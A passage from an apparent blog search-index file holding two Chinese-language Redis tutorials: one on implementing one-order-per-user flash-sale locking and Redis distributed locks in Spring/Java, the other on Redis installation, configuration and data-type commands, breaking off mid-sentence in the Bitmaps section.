  }\n\n        // 6.扣减库存\n        boolean success = seckillVoucherService.update()\n                .setSql(\"stock = stock - 1\") // set stock = stock - 1\n                .eq(\"voucher_id\", voucherId).gt(\"stock\", 0) // where id = ? and stock > 0\n                .update();\n        if (!success) {\n            // 扣减失败\n            return Result.fail(\"库存不足！\");\n        }\n\n        // 7.创建订单\n        VoucherOrder voucherOrder = new VoucherOrder();\n        // 7.1.订单id\n        long orderId = redisIdWorker.nextId(\"order\");\n        voucherOrder.setId(orderId);\n        // 7.2.用户id\n        voucherOrder.setUserId(userId);\n        // 7.3.代金券id\n        voucherOrder.setVoucherId(voucherId);\n        save(voucherOrder);\n\n        // 7.返回订单id\n        return Result.ok(orderId);\n    }\n}\n```\n\n但是以上代码还是存在问题，问题的原因在于当前方法被spring的事务控制，如果你在方法内部加锁，可能会导致当前方法事务还没有提交，但是锁已经释放也会导致问题，所以我们选择将当前方法整体包裹起来，确保事务不会出现问题。在seckillVoucher 方法中，添加以下逻辑，这样就能保证事务的特性，同时也控制了锁的粒度\n\n```java\n@Override\npublic Result seckillVoucher(Long voucherId) {\n    //....\n    Long userId = UserHolder.getUser().getId();\n    synchronized(userId.toString().intern()){\n      return this.createVoucherOrder(voucherId);\n    }\n}\n```\n\n但是以上做法依然有问题，因为你调用的方法，其实是`this.`的方式调用的，事务想要生效，还得利用代理来生效，所以这个地方，我们需要获得原始的事务对象， 来操作事务\n\n```java\n@Override\npublic Result seckillVoucher(Long voucherId) {\n    //....\n  Long userId = UserHolder.getUser().getId();\n  synchronized (userId.toString().intern()) {\n    IVoucherOrderService proxy = (IVoucherOrderService) AopContext.currentProxy();\n    return proxy.createVoucherOrder(voucherId);\n  }\n}\n```\n\n需要添加依赖和注解\n\n```xml\n<dependency>\n  <groupId>org.aspectj</groupId>\n  <artifactId>aspectjweaver</artifactId>\n</dependency>\n```\n\n```java\n@EnableAspectJAutoProxy(exposeProxy = true) //添加这一条\n@MapperScan(\"com.kbdp.mapper\")\n@SpringBootApplication\npublic class KbDianPingApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(KbDianPingApplication.class, args);\n    }\n}\n```\n\n## ❼集群环境下的并发问题\n\n通过加锁可以解决在单机情况下的一人一单安全问题，但是在集群模式下就不行了。\n\n1、我们将服务启动两份，端口分别为8081和8082：\n\n![](https://img.jwt1399.top/img/202211262006305.png)\n\n2、然后修改nginx的conf目录下的nginx.conf文件，配置反向代理和负载均衡：\n\n![](https://img.jwt1399.top/img/202211262006090.png)\n\n**有关锁失效原因分析**\n\n由于现在我们部署了多个tomcat，每个tomcat都有一个属于自己的jvm，那么假设在服务器A的tomcat内部，有两个线程，这两个线程由于使用的是同一份代码，那么他们的锁对象是同一个，是可以实现互斥的，但是如果现在是服务器B的tomcat内部，又有两个线程，但是他们的锁对象写的虽然和服务器A一样，但是锁对象却不是同一个，所以线程3和线程4可以实现互斥，但是却无法和线程1和线程2实现互斥，这就是集群环境下，syn锁失效的原因，在这种情况下，我们就需要使用分布式锁来解决这个问题。\n\n![](https://img.jwt1399.top/img/202211262007757.png)\n\n# ④分布式锁\n\n## ❶基本原理\n\n分布式锁：满足分布式系统或集群模式下多进程可见并且互斥的锁。\n\n分布式锁的核心思想：让大家都使用同一把锁，只要大家使用的是同一把锁，那么我们就能锁住线程，不让线程进行，让程序串行执行，这就是分布式锁的核心思路\n\n![](https://img.jwt1399.top/img/202211262012190.png)\n\n分布式锁应该满足什么样的条件呢？\n\n![](https://img.jwt1399.top/img/202211262011958.png)\n\n- 可见性：多个线程都能看到相同的结果\n\n- 互斥：互斥是分布式锁的最基本的条件，使得程序串行执行\n\n- 高可用：程序不易崩溃，时时刻刻都保证较高的可用性\n\n- 高性能：由于加锁本身就让性能降低，所有对于分布式锁本身需要他就较高的加锁性能和释放锁性能\n\n- 安全性：安全也是程序中必不可少的一环\n\n常见的分布式锁有三种\n\n- Mysql：mysql本身就带有锁机制，但是由于mysql性能本身一般，所以分布式锁的情况下，使用mysql作为分布式锁比较少见\n\n- Redis：现在企业级开发中基本都使用redis或者zookeeper作为分布式锁，redis利用setnx方法，如果插入key成功，表示获得到了锁，如果有人插入成功，其他人插入失败表示无法获得到锁，利用这套逻辑来实现分布式锁\n\n- Zookeeper：zookeeper也是企业级开发中较好的一个实现分布式锁的方案\n\n![](https://img.jwt1399.top/img/202211262015600.png)\n\n## ❷Redis分布式锁实现思路\n\n实现分布式锁时需要实现的两个基本方法：\n\n* 获取锁：\n\n  * 互斥：确保只能有一个线程获取锁\n  * 非阻塞：尝试一次，成功返回true，失败返回false\n\n```sql\n# 添加锁，NX是互斥 EX是设置超时时间\nSET Lock threadl EX 10 NX\n```\n\n```sql\n# 上面命令是下面两条命令的结合\n# 上面命令是下面两条命令的同时执行，为了保证原子性，防止应为redis宕机，导致键无法删除\n\n# 添加锁，利用setnx的互斥特性\nSETNX lock thread1\n\n# 添加锁过期时间，避免服务宕机引起的死锁\nEXPIRE lock 10\n```\n\n* 释放锁：\n  * 手动释放\n  * 超时释放：获取锁时添加一个超时时间\n\n\n```sql\n# 释放锁，删除即可\nDEL key\n```\n\n核心思路：利用 redis 的 SETNX 方法，当有多个线程进入时，我们就利用该方法，第一个线程进入时，redis 中就有这个key了，返回了1，如果结果是1，则表示他抢到了锁，那么他去执行业务，然后再删除锁，退出锁逻辑，没有抢到锁的等待一定时间后重试即可\n\n<img src=\"https://img.jwt1399.top/img/202211262049701.png\"  style=\"zoom: 50%;\" />\n\n## ❸实现分布式锁初级版本\n\n> 需求：定义一个类，实现下面接口，利用Redis实现分布式锁功能。\n\n```java\npublic interface ILock {\n  /**  \n   * 尝试获取锁    \n   * @param timeoutSec 锁持有的超时时间，过期后自动释放 \n   * @return true代表获取锁成功; false代表获取锁失败   \n   */   \n  boolean tryLock(long timeoutSec);\n  /**\n   * 释放锁  \n   */  \n  void unlock();\n}\n```\n\n- 实现类\n\n```java\npublic class SimpleRedisLock implements ILock{\n  \n    private String name; //服务名称作为键\n    private StringRedisTemplate stringRedisTemplate;\n\n    public SimpleRedisLock(String name, StringRedisTemplate stringRedisTemplate) {\n        this.name = name;\n        this.stringRedisTemplate = stringRedisTemplate;\n    }\n\n    @Override\n    public boolean tryLock(long timeoutSec) {\n        return false;\n    }\n\n    @Override\n    public void unlock() {\n\n    }\n}\n\n```\n\n- 获取锁：利用setnx方法进行加锁，同时增加过期时间，防止死锁，可以保证加锁和增加过期时间具有原子性\n\n```java\nprivate static final String KEY_PREFIX=\"lock:\"\n@Override\npublic boolean tryLock(long timeoutSec) {\n    // 获取线程标示作为值\n    String threadId = Thread.currentThread().getId()\n    // 获取锁\n    Boolean success = stringRedisTemplate.opsForValue()\n            .setIfAbsent(KEY_PREFIX + name, threadId + \"\", timeoutSec, TimeUnit.SECONDS);\n    return Boolean.TRUE.equals(success); //避免自动拆箱空指针\n}\n```\n\n* 释放锁释：防止删除别人的锁\n\n```java\npublic void unlock() {\n    //通过del删除锁\n    stringRedisTemplate.delete(KEY_PREFIX + name);\n}\n```\n\n* 修改业务代码\n\n```java\n@Override\npublic Result seckillVoucher(Long voucherId) {\n    // 1.查询优惠券\n    SeckillVoucher voucher = seckillVoucherService.getById(voucherId);\n    // 2.判断秒杀是否开始\n    if (voucher.getBeginTime().isAfter(LocalDateTime.now())) {\n      // 尚未开始\n      return Result.fail(\"秒杀尚未开始！\");\n    }\n    // 3.判断秒杀是否已经结束\n    if (voucher.getEndTime().isBefore(LocalDateTime.now())) {\n      // 尚未开始\n      return Result.fail(\"秒杀已经结束！\");\n    }\n    // 4.判断库存是否充足\n    if (voucher.getStock() < 1) {\n      // 库存不足\n      return Result.fail(\"库存不足！\");\n    }\n    Long userId = UserHolder.getUser().getId();\n    //创建锁对象(新增代码)\n    SimpleRedisLock lock = new SimpleRedisLock(\"order:\" + userId, stringRedisTemplate);\n    //获取锁对象\n    boolean isLock = lock.tryLock(1200);\n    //加锁失败\n    if (!isLock) {\n      return Result.fail(\"不允许重复下单\");\n    }\n    try {\n      //获取代理对象(事务)\n      IVoucherOrderService proxy = (IVoucherOrderService) AopContext.currentProxy();\n      return proxy.createVoucherOrder(voucherId);\n    } finally {\n      //释放锁\n      lock.unlock();\n    }\n}\n```\n\n## ❹Redis分布式锁误删问题\n\n**问题描述**：持有锁的线程在锁的内部出现了阻塞，导致他的锁超时自动释放，这时其他线程，线程2来尝试获得锁，就拿到了这把锁，然后线程2在持有锁执行过程中，线程1反应过来，继续执行，而线程1执行过程中，走到了删除锁逻辑，此时就会把本应该属于线程2的锁进行删除，这就是误删别人锁的情况说明\n\n![](https://img.jwt1399.top/img/202211262127536.png)\n\n**解决方案**：解决方案就是在每个线程释放锁的时候，去判断一下当前这把锁是否属于自己，如果属于自己，则不进行锁的删除，假设还是上边的情况，线程1卡顿，锁自动释放，线程2进入到锁的内部执行逻辑，此时线程1反应过来，然后删除锁，但是线程1，一看当前这把锁不是属于自己，于是不进行删除锁逻辑，当线程2走到删除锁逻辑时，如果没有卡过自动释放锁的时间点，则判断当前这把锁是属于自己的，于是删除这把锁。\n\n![](https://img.jwt1399.top/img/202211262127624.png)\n\n## ❺解决分布式锁误删问题\n\n修改之前的分布式锁实现使其满足：在获取锁时存入线程标示（可以用UUID表示），在释放锁时先获取锁中的线程标示，判断是否与当前线程标示一致\n\n* 如果一致则释放锁\n* 如果不一致则不释放锁\n\n核心逻辑：在存入锁时，放入自己线程的标识，在删除锁时，判断当前这把锁的标识是不是自己存入的，如果是，则进行删除，如果不是，则不进行删除。\n\n<img src=\"https://img.jwt1399.top/img/202211262127471.png\" style=\"zoom:50%;\" />\n\n- 加锁\n\n```java\nprivate static final String ID_PREFIX = UUID.randomUUID().toString(true) + \"-\";\n@Override\npublic boolean tryLock(long timeoutSec) {\n   // 获取线程标示\n   String threadId = ID_PREFIX + Thread.currentThread().getId();\n   // 获取锁\n   Boolean success = stringRedisTemplate.opsForValue()\n                .setIfAbsent(KEY_PREFIX + name, threadId, timeoutSec, TimeUnit.SECONDS);\n   return Boolean.TRUE.equals(success);\n}\n```\n\n- 释放锁\n\n```java\npublic void unlock() {\n    // 获取线程标示\n    String threadId = ID_PREFIX + Thread.currentThread().getId();\n    // 获取锁中的标示\n    String id = stringRedisTemplate.opsForValue().get(KEY_PREFIX + name);\n    // 判断标示是否一致\n    if(threadId.equals(id)) {\n        // 释放锁\n        stringRedisTemplate.delete(KEY_PREFIX + name);\n    }\n}\n```\n\n**测试：**在我们修改完此处代码后，重启工程，然后启动两个线程，第一个线程持有锁后，手动释放锁，第二个线程 此时进入到锁内部，再放行第一个线程，此时第一个线程由于锁的value值并非是自己，所以不能释放锁，也就无法删除别人的锁，此时第二个线程能够正确释放锁，通过这个案例初步说明我们解决了锁误删的问题。\n\n## ❻分布式锁的原子性问题\n\n\n\n\n\n达人探店\n\n⑤好友关注\n\n⑥附近的商户\n\n⑦用户签到\n\n⑧UV统计\n\n# Sponsor❤️\n\n您的支持是我不断前进的动力，如果您感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝</td>\n         <td style=\"text-align:center;\">微信</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["NoSQL"],"categories":["SQL"]},{"title":"Redis-基础篇","url":"/posts/27273.html","content":"\n\n\n# 一、Redis简介\n\n## 1.认识NoSQL\n\n### 1.1\t什么是NoSQL\n\n---\n\n- NoSQL最常见的解释是\"`non-relational`\"，泛指**非关系型的数据库**，很多人也说它是\"***Not Only SQL***\"\n\n- NoSQL 不依赖业务逻辑方式存储，而以简单的key-value模式存储。因此大大的增加了数据库的扩展能力。\n\n- 区别于关系数据库，它们不保证关系数据的ACID特性\n- 常见的NoSQL数据库有：`Redis`、`MemCache`、`MongoDB`等\n\n### 1.2 NoSQL适用场景\n\n- 对数据高并发的读写\n\n- 海量数据的读写\n\n- 对数据高可扩展性的\n\n### 1.3  NoSQL不适用场景\n\n- 需要事务支持\n\n- 基于sql的结构化查询存储，处理复杂的关系，需要即席查询。\n\n### 1.4\tNoSQL与SQL的差异\n\n---\n\n|          |                            SQL                             |                            NoSQL                             |\n| :------: | :--------------------------------------------------------: | :----------------------------------------------------------: |\n| 数据结构 |                           结构化                           |                           非结构化                           |\n| 数据关联 |                           关联的                           |                           无关联的                           |\n| 查询方式 |                          SQL查询                           |                            非SQL                             |\n| 事务特性 |                            ACID                            |                             BASE                             |\n| 存储方式 |                            磁盘                            |                             内存                             |\n|  扩展性  |                            垂直                            |                             水平                             |\n| 使用场景 | 1）数据结构固定<br>2）相关业务对数据安全性、一致性要求较高 | 1）数据结构不固定<br>2）对一致性、安全性要求不高<br>3）对性能要求 |\n\n## 2.认识Redis\n\n> Redis诞生于2009年全称是Remote Dictionary Server，远程词典服务器，是一个基于内存的键值型NoSQL数据库。\n\n**Redis的特征：**\n\n- 键值（`key-value`）型，value支持多种不同数据结构，功能丰富\n- 单线程，每个命令具备原子性\n- 低延迟，速度快（基于内存、IO多路复用、良好的编码）\n- 支持数据持久化\n- 支持主从集群、分片集群\n- 支持多语言客户端\n\n# 二、Redis安装\n\n## 1.Mac安装Redis\n\n### 1.1 安装redis\n\n```bash\nbrew install redis\n```\n\n### 1.2 启动Redis\n\n```bash\n# 启动\nbrew services start redis\n==> Successfully started `redis` (label: homebrew.mxcl.redis)\n# 关闭\nbrew services stop redis\n\n# 连接redis\nredis-cli\n\n# 关闭连接，并退出\n127.0.0.1:6379> shutdown\nnot connected> quit\n```\n\n### 1.3 其它操作\n\n**远程连接Redis**\n\n```bash\nredis-cli -h xxx.xx.xx.xx -p 6379 -a 123456\n```\n\n- `-h xxx.xx.xx.xx`：指定要连接的redis节点的IP地址，默认是127.0.0.1\n- `-p 6379`：指定要连接的redis节点的端口，默认是6379\n- `-a 123456`：指定redis的访问密码 \n\n**指定密码**\n\n```bash\n#方法1\n#在配置文件中配置requirepass的密码（当redis重启后密码依然有效）。\nrequirepass foobared 修改成 : requirepass  123321\n\n#方法2（当redis重启后密码无效）。\n127.0.0.1:6379>config set requirepass 123321 #设置密码\nOk\n127.0.0.1:6379>config get requirepass #查看密码\n\n\n127.0.0.1:6379> auth 123321 #指定密码（登录时未指定密码可以用此命令制定密码）\nOk\n```\n\n**心跳测试**\n\n```bash\n127.0.0.1:6379> ping \nPONG\n```\n\n## 2.Linux安装Redis\n\n---\n\n> 本次安装Redis是基于Linux系统下安装的，因此需要一台Linux服务器或者虚拟机。如果您使用的是自己购买的服务器，请提前开放`6379`端口，避免后续出现的莫名其妙的错误！\n>\n\n### 2.1 安装依赖\n\n---\n\n> Redis是基于C语言编写的，因此首先需要安装Redis所需要的gcc依赖\n\n```sh\nyum install -y gcc tcl\n```\n\n**安装成功如下图所示：**\n\n![](https://img.jwt1399.top/img/202207161119201.png)\n\n### 2.2 安装Redis\n\n---\n\n**将`redis-6.2.6.tar`上传至`/usr/local/src`目录**\n\n![](https://img.jwt1399.top/img/202207161119399.png)\n\n**在xShell中`cd`到`/usr/local/src`目录执行以下命令进行解压操作**\n\n```sh\ntar -xzf redis-6.2.6.tar.gz\n```\n\n**解压成功后依次执行以下命令**\n\n```sh\ncd redis-6.2.6\nmake\nmake install\n```\n\n**安装成功后打开/usr/local/bin目录（该目录为Redis默认的安装目录）**\n\n![](https://img.jwt1399.top/img/202207161119072.png)\n\n### 2.3 启动Redis\n\n> Redis的启动方式有很多种，例如：**前台启动**、**后台启动**、**开机自启**\n\n#### 前台启动（不推荐）\n\n---\n\n> **这种启动属于前台启动，会阻塞整个会话窗口，窗口关闭或者按下`CTRL + C`则Redis停止。不推荐使用。**\n\n**安装完成后，在任意目录输入`redis-server`命令即可启动Redis**\n\n```sh\nredis-server\n```\n\n**启动成功如下图所示**\n\n![](https://img.jwt1399.top/img/202207161121008.png)\n\n#### 后台启动（不推荐）\n\n---\n\n> **如果要让Redis以后台方式启动，则必须修改Redis配置文件，配置文件所在目录就是之前我们解压的安装包下**\n\n**因为我们要修改配置文件，因此我们需要先将原文件备份一份**\n\n```sh\ncd /usr/local/src/redis-6.2.6\n```\n\n```sh\ncp redis.conf redis.conf.bck\n```\n\n**然后修改`redis.conf`文件中的一些配置**\n\n```sh\n# 允许访问的地址，默认是127.0.0.1，会导致只能在本地访问。修改为0.0.0.0则可以在任意IP访问，生产环境不要设置为0.0.0.0\nbind 0.0.0.0\n# 守护进程，修改为yes后即可后台运行\ndaemonize yes \n# 密码，设置后访问Redis必须输入密码\nrequirepass 1325\n```\n\n**Redis其他常用配置**\n\n```sh\n# 监听的端口\nport 6379\n# 工作目录，默认是当前目录，也就是运行redis-server时的命令，日志、持久化等文件会保存在这个目录\ndir .\n# 数据库数量，设置为1，代表只使用1个库，默认有16个库，编号0~15\ndatabases 1\n# 设置redis能够使用的最大内存\nmaxmemory 512mb\n# 日志文件，默认为空，不记录日志，可以指定日志文件名\nlogfile \"redis.log\"\n```\n\n**启动Redis**\n\n```sh\n# 进入redis安装目录 \ncd /usr/local/src/redis-6.2.6\n# 启动\nredis-server redis.conf\n```\n\n**停止Redis服务**\n\n```sh\n# 通过kill命令直接杀死进程\nkill -9 redis进程id\n```\n\n```sh\n# 利用redis-cli来执行 shutdown 命令，即可停止 Redis 服务，\n# 因为之前配置了密码，因此需要通过 -a 来指定密码\nredis-cli -a 132537 shutdown\n```\n\n#### 开机自启（推荐）\n\n---\n\n> **我们也可以通过配置来实现开机自启**\n\n**首先，新建一个系统服务文件**\n\n```sh\nvi /etc/systemd/system/redis.service\n```\n\n**将以下命令粘贴进去**\n\n```sh\n[Unit]\nDescription=redis-server\nAfter=network.target\n\n[Service]\nType=forking\nExecStart=/usr/local/bin/redis-server /usr/local/src/redis-6.2.6/redis.conf\nPrivateTmp=true\n\n[Install]\nWantedBy=multi-user.target\n```\n\n**然后重载系统服务**\n\n```sh\nsystemctl daemon-reload\n```\n\n**现在，我们可以用下面这组命令来操作redis了**\n\n```sh\n# 启动\nsystemctl start redis\n# 停止\nsystemctl stop redis\n# 重启\nsystemctl restart redis\n# 查看状态\nsystemctl status redis\n```\n\n**执行下面的命令，可以让redis开机自启**\n\n```sh\nsystemctl enable redis\n```\n\n# 三、Redis命令\n\n通过Redis的中文文档学习：http://www.redis.cn/commands.html\n\n通过菜鸟教程官网来学习：https://www.runoob.com/redis/redis-keys.html\n\n**Redis是一个key-value的数据库，key一般是String类型，不过value的类型多种多样**\n\n![](https://img.jwt1399.top/img/202207161135146.png)\n\n## 1.通用命令\n\n|   指令   |                         描述                          |\n| :------: | :---------------------------------------------------: |\n|   keys   |   查看符合模板的所有key，不建议在生产环境设备上使用   |\n|   del    |                   删除一个指定的key                   |\n|  exists  |                    判断key是否存在                    |\n|  expire  |  给一个key设置有效期，有效期到期时该key会被自动删除   |\n|   ttl    | 查看一个KEY的剩余有效期，-1表示永不过期，-2表示已过期 |\n|   type   |                 查看你的key是什么类型                 |\n|  unlink  |                根据value选择非阻塞删除                |\n|  select  |                      切换数据库                       |\n|  dbsize  |               查看当前数据库的key的数量               |\n| flushdb  |                      清空当前库                       |\n| flushall |                      通杀全部库                       |\n\n可以通过`help [command] `可以查看一个命令的具体用法！\n\n## 2.基本类型\n\n### 2.1 字符串-String\n\nString类型是Redis最基本的数据类型，一个Redis中字符串value最多可以是512M\n\n> **String的常见命令**\n\n|     命令      |                             描述                             |\n| :-----------: | :----------------------------------------------------------: |\n|      set      |         添加或者修改已经存在的一个String类型的键值对         |\n|      get      |                 根据key获取String类型的value                 |\n|     mset      |                批量添加多个String类型的键值对                |\n|     mget      |             根据多个key获取多个String类型的value             |\n|    Strlen     |                       获得value的长度                        |\n|   incr/decr   |                  让一个整型的key自增/自减1                   |\n| incrby/decrby | 让一个整型的key自增/自减，并指定步长，例如：incrby num 2 让num值自增2 |\n|  incrbyfloat  |              让一个浮点类型的数字自增并指定步长              |\n|     setnx     |   添加一个String类型的键值对，前提是这个key不存在，才执行    |\n|     setex     |          添加一个String类型的键值对，并且指定有效期          |\n|   getrange    |           获得value的范围，例如：getrange name 0 4           |\n|   setrange    |   从指定位置覆盖key存储的value，例如：setrange name 0 jian   |\n|    getset     | 以新换旧，设置了新值同时获得旧值。例如：getset name xiaojian |\n\n数据结构：String的数据结构为简单动态字符串(Simple Dynamic String,缩写SDS)。是可以修改的字符串，内部结构实现上类似于Java的ArrayList，采用预分配冗余空间的方式来减少内存的频繁分配.\n\n### 2.2 哈希-Hash\n\nhash是一个string类型的field和value的映射表，hash特别适合用于存储对象。类似Java里面的HashMap\n\n每个 hash 可以存储 2<sup>32</sup> - 1 键值对（40多亿）。\n\n![](https://img.jwt1399.top/img/202207161523224.png)\n\n> Hash的常见命令\n\n|         命令         |                             描述                             |\n| :------------------: | :----------------------------------------------------------: |\n| hset key field value |              添加或者修改hash类型key的field的值              |\n|    hget key field    |                获取一个hash类型key的field的值                |\n|        hmset         |       hmset 和 hset 效果相同 ，4.0之后hmset可以弃用了        |\n|        hmget         |              批量获取多个hash类型key的field的值              |\n|       hgetall        |         获取一个hash类型的key中的所有的field和value          |\n|        hkeys         |             获取一个hash类型的key中的所有的field             |\n|        hvals         |             获取一个hash类型的key中的所有的value             |\n|       hincrby        |           让一个hash类型key的字段值自增并指定步长            |\n|        hsetnx        | 添加一个hash类型的key的field值，前提是这个field不存在，否则不执行 |\n\n```bash\n127.0.0.1:6379> hset userkey name \"jack\" age 18 birth \"2004-07\"\n(integer) 3\n127.0.0.1:6379> hgetall userkey\n1) \"name\"\n2) \"jack\"\n3) \"age\"\n4) \"18\"\n5) \"birth\"\n6) \"2004-07\"\n```\n\n> 数据结构\n\nHash类型对应的数据结构是两种：ziplist（压缩列表），hashtable（哈希表）。当field-value长度较短且个数较少时，使用ziplist，否则使用hashtable。\n\n### 2.3 列表-List\n\nRedis中的List类型与Java中的LinkedList类似，可以看做是一个双向链表结构。既可以支持正向检索和也可以支持反向检索。\n\n一个列表最多可以包含 2<sup>32</sup> - 1 个元素 (4294967295, 每个列表超过40亿个元素)。\n\n**特征也与`LinkedList`类似：**\n\n- 有序\n- 元素可以重复\n- 插入和删除快\n- 查询速度一般\n\n常用来存储一个有序数据，例如：朋友圈点赞列表，评论列表等。\n\n![](https://img.jwt1399.top/img/202207161524345.png)\n\n> List的常见命令\n\n|            命令             |                             描述                             |\n| :-------------------------: | :----------------------------------------------------------: |\n|   lpush key  element ...    |                 向列表左侧插入一个或多个元素                 |\n|          lpop key           |                移除并返回列表左侧的第一个元素                |\n|   rpush key  element ...    |                 向列表右侧插入一个或多个元素                 |\n|          rpop key           |                移除并返回列表右侧的第一个元素                |\n|     lrange key star end     |                 返回一段角标范围内的所有元素                 |\n|        blpop和brpop         | 与LPOP和RPOP类似，只不过在没有元素时等待指定时间，而不是直接返回nil |\n|  rpoplpush \\<key1>\\<key2>   |      从\\<key1>列表右边吐出一个值，插到\\<key2>列表左边。      |\n|   lindex  \\<key>\\<index>    |                按照索引下标获得元素(从左到右)                |\n|         llen \\<key>         |                         获得列表长度                         |\n|   lrem \\<key>\\<n>\\<value>   |                      从左边删除n个value                      |\n| lset \\<key>\\<index>\\<value> |             将列表key下标为index的值替换成value              |\n\n![](https://img.jwt1399.top/img/202207161553022.gif)\n\n> 数据结构\n\nList的数据结构为快速链表quickList和压缩链表ziplist。\n\n当列表元素较少的情况下会使用一块连续的内存存储，这个结构是ziplist。它将所有的元素紧挨着一起存储，分配的是一块连续的内存。\n\n当数据量比较多的时候才会改成quicklist。因为普通的链表需要的附加指针空间太大，会比较浪费空间。比如这个列表里存的只是int类型的数据，结构上还需要两个额外的指针prev和next。\n\n将链表和ziplist结合起来组成了quicklist。也就是将多个ziplist使用双向指针串起来使用。这样既满足了快速的插入删除性能，又不会出现太大的空间冗余。\n\n> **思考问题**\n\n- **如何利用List结构模拟一个栈?**\n\n  - 先进后出，入口和出口在同一边\n\n- **如何利用List结构模拟一个队列?**\n\n  - 先进先出，入口和出口在不同边\n\n- **如何利用List结构模拟一个阻塞队列?**\n  - 入口和出口在不同边\n  - 出队时采用BLPOP或BRPOP\n\n### 2.4 集合-Set\n\nRedis的Set是string类型的无序集合。它底层其实是一个value为null的hash表，与Java中的HashSet类似，因此具备与HashSet类似的特征\n\n- 无序\n- 元素不可重复\n- 查找快\n- 支持交集、并集、差集等功能\n\n> **Set的常见命令有**\n\n|            命令            |                   描述                    |\n| :------------------------: | :---------------------------------------: |\n|    sadd key member ...     |         向set中添加一个或多个元素         |\n|    srem key member ...     |            移除set中的指定元素            |\n|         scard key          |            返回set中元素的个数            |\n|    sismember key member    |        判断一个元素是否存在于set中        |\n|        smembers key        |            获取set中的所有元素            |\n|    sinter key1 key2 ...    |            求key1与key2的交集             |\n|    sdiff key1 key2 ...     |            求key1与key2的差集             |\n|    sunion key1 key2 ..     |            求key1和key2的并集             |\n|          spop key          |         随机从该集合中吐出一个值          |\n|   srandmember \\<key>\\<n>   | 随机从该集合中取出n个值。不会从集合中删除 |\n| smove \\<source>\\<des>value | 把集合中一个值从一个集合移动到另一个集合  |\n\n> 交集、差集、并集图示\n\n![](https://img.jwt1399.top/img/202207161610130.png)\n\n> 数据结构\n\nSet数据结构是dict字典，字典是用哈希表实现的。Java中HashSet的内部实现使用的是HashMap，只不过所有的value都指向同一个对象。Redis的set结构也是一样，它的内部也使用hash结构，所有的value都指向同一个内部值。\n\n### 2.5 有序集合-ZSet\n\nRedis的ZSet（SortedSet）是一个可排序的set集合，与Java中的TreeSet有些类似，但底层数据结构却差别很大。SortedSet中的每一个元素都带有一个score属性，可以基于score属性对元素排序，底层的实现是一个跳表（SkipList）加 hash表。\n\n**SortedSet具备下列特性：**\n\n- 可排序\n- 元素不重复\n- 查询速度快\n\n因为SortedSet的可排序特性，经常被用来实现排行榜这样的功能。\n\n> SortedSet的常见命令\n\n|             命令             |                             描述                             |\n| :--------------------------: | :----------------------------------------------------------: |\n|    zadd key score member     | 添加一个或多个元素到sorted set ，如果已经存在则更新其score值 |\n|       zrem key member        |                删除sorted set中的一个指定元素                |\n|      zscore key member       |             获取sorted set中的指定元素的score值              |\n|       zrankkey member        |              获取sorted set 中的指定元素的排名               |\n|          zcard key           |                  获取sorted set中的元素个数                  |\n|      zcount key min max      |           统计score值在给定范围内的所有元素的个数            |\n| zincrby key increment member |    让sorted set中的指定元素自增，步长为指定的increment值     |\n|      zrange key min max      |          按照score排序后，获取指定排名范围内的元素           |\n|  zrangebyscore key min max   |          按照score排序后，获取指定score范围内的元素          |\n|    zdiff、zinter、zunion     |                      求差集、交集、并集                      |\n\n**注意：所有的排名默认都是升序，如果要降序则在命令的Z后面添加`REV`即可**\n\n> 数据结构\n\nSortedSet(zset)是Redis提供的一个非常特别的数据结构，一方面它等价于Java的数据结构Map<String, Double>，可以给每一个元素value赋予一个权重score，另一方面它又类似于TreeSet，内部的元素会按照权重score进行排序，可以得到每个元素的名次，还可以通过score的范围来获取元素的列表。\n\nzset底层使用了两个数据结构\n\n（1）hash，hash的作用就是关联元素value和权重score，保障元素value的唯一性，可以通过元素value找到相应的score值。\n\n（2）跳跃表，跳跃表的目的在于给元素value排序，根据score的范围获取元素列表。\n\n## 3.特殊类型\n\n### 3.1 Bitmaps\n\n> 简介\n\nRedis 提供了 Bitmaps 可以实现对位的操作，可以把 Bitmaps 想象成一个以位为单位的数组， 数组的每个单元只能存储 0 和 1， 数组的下标在 Bitmaps 中叫做偏移量。\n\n![](https://img.jwt1399.top/img/202207171437184.png)\n\n> Bitmaps的常见命令\n\n- setbit \\<key> \\<offset> \\<value> 设置Bitmaps中某个偏移量的值（0或1）\n\n- getbit \\<key> \\<offset> 获取Bitmaps中某个偏移量的值\n- bitcount \\<key> [start end] 统计字符串从start字节到end字节比特值为1的数量\n- bitop and(or/not/xor) \\<destkey> [key…] 可以做多个Bitmaps的and（交集） 、 or（并集） 、 not（非） 、 xor（异或） 操作并将结果保存在destkey中。\n\n> 实例1\n\n每个独立用户是否访问过网站，结果存放在Bitmaps中， 将访问的用户记做1， 没有访问的用户记做0， 用偏移量作为用户的id。 假设现在有20个用户，userid=1， 6， 11， 15， 19的用户对网站进行了访问， 那么当前Bitmaps初始化结果如图\n\n![](/Users/jianjian/jwt1399.github.io/source/images/Redis/image-20220717143701738.png)\n\nusers:20220717代表2022-07-17这天的独立访问用户的Bitmaps\n\n```bash\n127.0.0.1:6379> setbit users:20220717 1 1\n(integer) 0\n127.0.0.1:6379> setbit users:20220717 6 1\n(integer) 0\n127.0.0.1:6379> setbit users:20220717 11 1\n(integer) 0\n127.0.0.1:6379> setbit users:20220717 15 1\n(integer) 0\n127.0.0.1:6379> setbit users:20220717 19 1\n(integer) 0\n```\n\n获取id=6，8的用户是否在2022-07-17这天访问过， 返回0说明没有访问过，返回1说明访问过\n\n```bash\n127.0.0.1:6379> getbit users:20220717 6\n(integer) 1\n127.0.0.1:6379> getbit users:20220717 8\n(integer) 0\n```\n\n计算2022-07-17这天的独立访问用户数量\n\n```bash\n127.0.0.1:6379> bitcount users:20220717\n(integer) 5\n```\n\nstart和end代表起始和结束字节数， 下面计算用户id在第1个字节到第3个字节之间的独立访问用户数， 对应的用户id是11， 15， 19。\n\n```bash\n127.0.0.1:6379> bitcount users:20220717 1 3\n(integer) 3\n```\n\n举例： K1 【01000001 01000000 00000000 00100001】，对应【0，1，2，3】\n\n- bitcount K1 1 2 ： 统计下标1、2字节组中bit=1的个数，即 